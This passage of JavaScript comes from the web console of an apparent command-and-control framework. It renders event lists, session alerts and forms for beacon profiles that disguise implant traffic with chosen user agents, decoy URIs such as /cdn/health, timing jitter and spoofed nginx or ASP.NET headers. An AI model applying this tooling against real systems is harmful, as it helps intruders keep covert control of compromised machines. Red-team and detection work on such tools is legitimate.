        C2.loadEvents(targetPage);
        const list = document.getElementById('c2-event-list');
        if (list) list.scrollIntoView({ behavior: 'smooth', block: 'start' });
    };

    C2.changeEventsPageSize = function() {
        const sel = document.getElementById('c2-events-page-size-pagination');
        if (!sel) return;
        const n = parseInt(sel.value, 10);
        if (n > 0) {
            C2.eventsPageSize = n;
            C2.loadEvents(1);
        }
    };

    C2.renderEventsPagination = function() {
        const paginationContainer = document.getElementById('c2-events-pagination');
        if (!paginationContainer) return;

        const total = C2.eventsTotal || 0;
        const currentPage = C2.eventsPage || 1;
        const pageSize = C2.eventsPageSize || 10;
        const totalPages = Math.max(1, Math.ceil(total / pageSize));

        if (total === 0) {
            paginationContainer.innerHTML = '';
            return;
        }

        const start = total === 0 ? 0 : (currentPage - 1) * pageSize + 1;
        const end = Math.min(currentPage * pageSize, total);

        let html = '<div class="monitor-pagination">';
        html += `
            <div class="pagination-info">
                <span>${escapeHtml(c2t('c2.events.paginationShow', { start, end, total }))}</span>
                <label class="pagination-page-size">
                    ${escapeHtml(c2t('c2.events.paginationPerPage'))}
                    <select id="c2-events-page-size-pagination" onchange="C2.changeEventsPageSize()">
                        <option value="10" ${pageSize === 10 ? 'selected' : ''}>10</option>
                        <option value="20" ${pageSize === 20 ? 'selected' : ''}>20</option>
                        <option value="50" ${pageSize === 50 ? 'selected' : ''}>50</option>
                        <option value="100" ${pageSize === 100 ? 'selected' : ''}>100</option>
                    </select>
                </label>
            </div>
            <div class="pagination-controls">
                <button type="button" class="btn-secondary" onclick="C2.goEventsPage(1)" ${currentPage === 1 ? 'disabled' : ''}>${escapeHtml(c2t('c2.events.paginationFirst'))}</button>
                <button type="button" class="btn-secondary" onclick="C2.goEventsPage(${currentPage - 1})" ${currentPage === 1 ? 'disabled' : ''}>${escapeHtml(c2t('c2.events.paginationPrev'))}</button>
                <span class="pagination-page">${escapeHtml(c2t('c2.events.paginationPage', { current: currentPage, total: totalPages }))}</span>
                <button type="button" class="btn-secondary" onclick="C2.goEventsPage(${currentPage + 1})" ${currentPage >= totalPages ? 'disabled' : ''}>${escapeHtml(c2t('c2.events.paginationNext'))}</button>
                <button type="button" class="btn-secondary" onclick="C2.goEventsPage(${totalPages})" ${currentPage >= totalPages ? 'disabled' : ''}>${escapeHtml(c2t('c2.events.paginationLast'))}</button>
            </div>
        `;
        html += '</div>';
        paginationContainer.innerHTML = html;
        if (typeof applyTranslations === 'function') applyTranslations(paginationContainer);
    };

    C2.collectCheckedEventIds = function() {
        return Array.from(document.querySelectorAll('.c2-event-check:checked')).map(cb => cb.getAttribute('data-id')).filter(Boolean);
    };

    C2.syncEventsToolbar = function() {
        const batchBtn = document.getElementById('c2-events-batch-delete');
        const ids = C2.collectCheckedEventIds();
        if (batchBtn) batchBtn.disabled = ids.length === 0;

        const all = document.querySelectorAll('.c2-event-check');
        const selAll = document.getElementById('c2-events-select-all');
        if (selAll && all.length) {
            const nChecked = document.querySelectorAll('.c2-event-check:checked').length;
            selAll.checked = nChecked === all.length;
            selAll.indeterminate = nChecked > 0 && nChecked < all.length;
        } else if (selAll) {
            selAll.checked = false;
            selAll.indeterminate = false;
        }
    };

    C2.onEventsSelectAll = function(checked) {
        document.querySelectorAll('.c2-event-check').forEach(cb => { cb.checked = checked; });
        C2.syncEventsToolbar();
    };

    C2.deleteEventById = function(id) {
        if (!id) return;
        if (!confirm(c2t('c2.events.confirmDeleteOne'))) return;
        apiRequest('DELETE', `${API_BASE}/events`, { ids: [id] }).then(data => {
            if (data.error) {
                showToast(String(data.error), 'error');
                return;
            }
            showToast(c2t('c2.events.toastDeleted', { n: data.deleted != null ? data.deleted : 1 }), 'success');
            C2.loadEvents(C2.eventsPage || 1);
        }).catch(err => showToast(err.message || String(err), 'error'));
    };

    C2.deleteSelectedEvents = function() {
        const ids = C2.collectCheckedEventIds();
        if (!ids.length) {
            showToast(c2t('c2.events.toastSelectFirst'), 'warn');
            return;
        }
        if (!confirm(c2t('c2.events.confirmBatchDelete', { n: ids.length }))) return;
        apiRequest('DELETE', `${API_BASE}/events`, { ids }).then(data => {
            if (data.error) {
                showToast(String(data.error), 'error');
                return;
            }
            const deleted = data.deleted != null ? data.deleted : ids.length;
            showToast(c2t('c2.events.toastDeleted', { n: deleted }), 'success');
            C2.loadEvents(C2.eventsPage || 1);
        }).catch(err => showToast(err.message || String(err), 'error'));
    };

    C2.renderEvents = function() {
        const container = document.getElementById('c2-event-list');
        if (!container) return;

        const selAll = document.getElementById('c2-events-select-all');
        if (selAll) {
            selAll.checked = false;
            selAll.indeterminate = false;
        }

        if (C2.events.length === 0) {
            container.innerHTML = '<div class="c2-empty">' + escapeHtml(c2t('c2.events.empty')) + '</div>';
            if (selAll) selAll.disabled = true;
            C2.syncEventsToolbar();
            return;
        }
        if (selAll) selAll.disabled = false;

        const delTitle = escapeHtml(c2t('c2.events.deleteOne'));
        container.innerHTML = C2.events.map(e => {
            const eid = escapeHtml(e.id || '');
            return `
            <div class="c2-event-item">
                <label class="c2-event-check-label" onclick="event.stopPropagation();">
                    <input type="checkbox" class="c2-event-check" data-id="${eid}" onchange="C2.syncEventsToolbar()">
                </label>
                <div class="c2-event-level ${escapeHtml(e.level || '')}"></div>
                <div class="c2-event-content">
                    <div class="c2-event-message">${escapeHtml(e.message)}</div>
                    <div class="c2-event-meta">
                        ${formatTime(e.createdAt)} · ${escapeHtml(e.category || '')}${e.sessionId ? ' · ' + escapeHtml(String(e.sessionId).substring(0, 8)) : ''}
                    </div>
                </div>
                <button type="button" class="btn-secondary c2-event-row-delete" onclick="event.stopPropagation();C2.deleteEventById('${eid}')" title="${delTitle}" aria-label="${delTitle}">🗑</button>
            </div>
        `;
        }).join('');

        C2.syncEventsToolbar();
        if (typeof applyTranslations === 'function') applyTranslations(container);
    };

    C2.connectEventStream = function() {
        if (C2.eventSource) C2.eventSource.close();

        let streamUrl = `${API_BASE}/events/stream`;
        if (typeof authToken !== 'undefined' && authToken) {
            streamUrl += `?token=${encodeURIComponent(authToken)}`;
        }
        C2.eventSource = new EventSource(streamUrl);
        C2.eventSource.onmessage = (e) => {
            try {
                const event = JSON.parse(e.data);
                C2.onEvent(event);
            } catch (err) {}
        };
        C2.eventSource.onerror = () => {
            setTimeout(() => C2.connectEventStream(), 5000);
        };
    };

    C2.onEvent = function(event) {
        if (window.currentPageId === 'c2-events' && (C2.eventsPage || 1) === 1) {
            C2.loadEvents(1);
        }

        const msg = event.message || '';
        const sessionOnline = event.category === 'session' && (
            msg.includes('上线') || msg.includes('新会话') || /new session/i.test(msg)
        );
        if (event.level === 'critical' || sessionOnline) {
            showToast(`[${event.category}] ${event.message}`, event.level === 'critical' ? 'error' : 'info');
        }

    };

    // ============================================================================
    // Profile 管理
    // ============================================================================

    C2.loadProfiles = function() {
        apiRequest('GET', `${API_BASE}/profiles`).then(data => {
            C2.profiles = data.profiles || [];
            C2.renderProfiles();
        });
    };

    C2.renderProfiles = function() {
        const container = document.getElementById('c2-profile-list');
        if (!container) return;

        if (C2.profiles.length === 0) {
            container.innerHTML = '<div class="c2-empty">' + escapeHtml(c2t('c2.profiles.empty')) + '</div>';
            return;
        }

        const defVal = c2t('c2.profiles.defaultValue');
        container.innerHTML = C2.profiles.map(p => `
            <div class="c2-profile-card">
                <div class="c2-profile-header">
                    <h4>${escapeHtml(p.name)}</h4>
                    <button class="btn-danger btn-sm" onclick="C2.deleteProfile('${p.id}')">${escapeHtml(c2t('common.delete'))}</button>
                </div>
                <div class="c2-profile-info">
                    <div><strong>UA:</strong> ${escapeHtml(p.userAgent || defVal)}</div>
                    <div><strong>URIs:</strong> ${escapeHtml((p.uris || []).join(', ') || defVal)}</div>
                    <div><strong>Jitter:</strong> ${p.jitterMinMs || 0}ms – ${p.jitterMaxMs || 0}ms</div>
                </div>
            </div>
        `).join('');
    };

    C2.showCreateProfileModal = function() {
        const modal = document.getElementById('c2-modal');
        const content = document.getElementById('c2-modal-content');
        if (!content) return;

        content.innerHTML = `
            <div class="c2-modal-header">
                <h3>${escapeHtml(c2t('c2.profiles.modalCreateTitle'))}</h3>
                <button class="c2-modal-close" onclick="C2.closeModal()">&times;</button>
            </div>
            <div class="c2-modal-body">
                <div class="c2-form-group">
                    <label>${escapeHtml(c2t('c2.profiles.profileNameLabel'))}</label>
                    <input type="text" id="c2-profile-name" class="form-control" placeholder="${escapeHtml(c2t('c2.profiles.placeholderProfileName'))}">
                </div>
                <div class="c2-form-group">
                    <label>${escapeHtml(c2t('c2.profiles.userAgent'))}</label>
                    <input type="text" id="c2-profile-ua" class="form-control" placeholder="Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...">
                    <div class="form-hint">${escapeHtml(c2t('c2.profiles.hintUa'))}</div>
                </div>
                <div class="c2-form-group">
                    <label>${escapeHtml(c2t('c2.profiles.labelBeaconUris'))}</label>
                    <textarea id="c2-profile-uris" class="form-control" rows="3" placeholder="/api/v1/status&#10;/cdn/health&#10;/assets/check">/api/v1/status</textarea>
                    <div class="form-hint">${escapeHtml(c2t('c2.profiles.hintUris'))}</div>
                </div>
                <div class="c2-form-row">
                    <div class="c2-form-group">
                        <label>${escapeHtml(c2t('c2.profiles.labelJitterMin'))}</label>
                        <input type="number" id="c2-profile-jmin" class="form-control" value="100" min="0">
                    </div>
                    <div class="c2-form-group">
                        <label>${escapeHtml(c2t('c2.profiles.labelJitterMax'))}</label>
                        <input type="number" id="c2-profile-jmax" class="form-control" value="500" min="0">
                    </div>
                </div>
                <div class="c2-form-group">
                    <label>${escapeHtml(c2t('c2.profiles.labelRespHeaders'))}</label>
                    <textarea id="c2-profile-headers" class="form-control" rows="3" placeholder='{"Server":"nginx","X-Powered-By":"ASP.NET"}'>{"Server":"nginx"}</textarea>
                    <div class="form-hint">${escapeHtml(c2t('c2.profiles.hintHeaders'))}</div>
                </div>
            </div>
            <div class="c2-modal-footer">
                <button class="btn-secondary" onclick="C2.closeModal()">${escapeHtml(c2t('common.cancel'))}</button>
                <button class="btn-primary" onclick="C2.createProfile()">${escapeHtml(c2t('c2.profiles.submitCreate'))}</button>
            </div>
        `;
        modal.style.display = 'flex';
    };

    C2.createProfile = function() {
        const name = document.getElementById('c2-profile-name')?.value.trim();
        if (!name) {
            showToast(c2t('c2.profiles.toastNameRequired'), 'error');
            return;
        }

        const userAgent = document.getElementById('c2-profile-ua')?.value.trim() || '';
        const urisRaw = document.getElementById('c2-profile-uris')?.value.trim() || '';
        const uris = urisRaw.split('\n').map(u => u.trim()).filter(u => u);
        const jitterMinMs = parseInt(document.getElementById('c2-profile-jmin')?.value) || 100;
        const jitterMaxMs = parseInt(document.getElementById('c2-profile-jmax')?.value) || 500;

        let responseHeaders = {};
        const headersRaw = document.getElementById('c2-profile-headers')?.value.trim();
        if (headersRaw) {
            try { responseHeaders = JSON.parse(headersRaw); }
            catch (e) { showToast(c2t('c2.profiles.toastInvalidHeadersJson'), 'error'); return; }
        }

        apiRequest('POST', `${API_BASE}/profiles`, {
            name,
            user_agent: userAgent,
            uris,
            jitter_min_ms: jitterMinMs,
            jitter_max_ms: jitterMaxMs,
            response_headers: responseHeaders
        }).then(data => {
            if (data.error) {
                showToast(data.error, 'error');
            } else {
                showToast(c2t('c2.profiles.toastCreated'), 'success');
                C2.closeModal();
                C2.loadProfiles();
            }
        });
    };

    C2.deleteProfile = function(id) {
        if (!confirm(c2t('c2.profiles.confirmDelete'))) return;
        apiRequest('DELETE', `${API_BASE}/profiles/${id}`, {}).then(data => {
            showToast(c2t('c2.profiles.toastDeleted'), 'success');
            C2.loadProfiles();
        });
    };

    // ============================================================================
    // 模态框
    // ============================================================================

    C2.copyTaskBlock = function(elementId) {
        const el = document.getElementById(elementId);
        if (el && el.textContent) copyToClipboard(el.textContent);
    };

    C2.closeModal = function() {
        const modal = document.getElementById('c2-modal');
        if (modal) {
            modal.style.display = 'none';
            const modalBox = modal.querySelector('.c2-modal');
            if (modalBox) modalBox.classList.remove('c2-modal--wide');
        }
    };

    // ============================================================================
    // 暴露到全局
    // ============================================================================

    window.C2 = C2;

    // 页面切换监听
    window.addEventListener('pageChanged', function(e) {
        if (e.detail?.pageId?.startsWith('c2')) {
            C2.init();
        }
    });

    // DOM 加载完成后初始化
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            if (window.currentPageId?.startsWith('c2')) C2.init();
        });
    } else {
        if (window.currentPageId?.startsWith('c2')) C2.init();
    }

    document.addEventListener('languagechange', function () {
        try {
            if (!window.currentPageId || !String(window.currentPageId).startsWith('c2')) return;
            if (typeof applyTranslations === 'function') applyTranslations(document);
            C2.init();
            if (C2.selectedSessionId && (window.currentPageId === 'c2-sessions')) {
                C2.renderSessions();
                C2.renderSessionDetail(C2.selectedSessionId);
            }
        } catch (e) {
            console.warn('languagechange C2 refresh failed', e);
        }
    });

})();
